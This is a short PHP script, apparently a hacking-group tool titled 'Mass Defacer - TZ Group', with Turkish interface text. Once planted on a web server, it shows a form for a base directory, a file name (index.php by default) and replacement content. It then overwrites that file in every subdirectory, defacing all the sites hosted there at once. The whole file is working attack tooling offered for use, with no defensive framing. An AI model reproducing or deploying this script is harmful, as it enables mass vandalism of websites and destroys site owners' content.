<?php

 
echo "<title>Mass Defacer - TZ Group </title>";
echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
echo "<body bgcolor='black'><font color='white'><font face='Electrolize'>";
echo "<center><form method='POST'>";
echo "Dir Dizini: <input type='text' name='base_dir' size='50' value='".getcwd ()."'><br><br>";
echo "Dosya Adı : <input type='text' name='file_name' value='index.php'><br><br>";
echo "İndex Linkin : <br><textarea style='width: 685px; height: 330px;' name='index'>İndex Nedir Hacım?</textarea><br>";
echo "<input type='submit' value='Gönder Gelsin'></form></center>";
 
if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']."Bulunamadı !<br>");
 
        if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." Böyle bir dizin yok hacı !<br>");
 
        @chdir ($_POST['base_dir']) or die ("Dizin Açılamadı Hacı ");
 
        $files = @scandir ($_POST['base_dir']) or die ("Omen Tonrim <br>");
 
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_POST['file_name'];
                        if (file_put_contents ($index, $_POST['index']))
                                echo "$index&nbsp&nbsp&nbsp&nbsp<span style='color: green'>Tamamdır Hacım İndex İşlemi Zorlama Fazla</span><br>";
                }
        endforeach;
}
 
?>
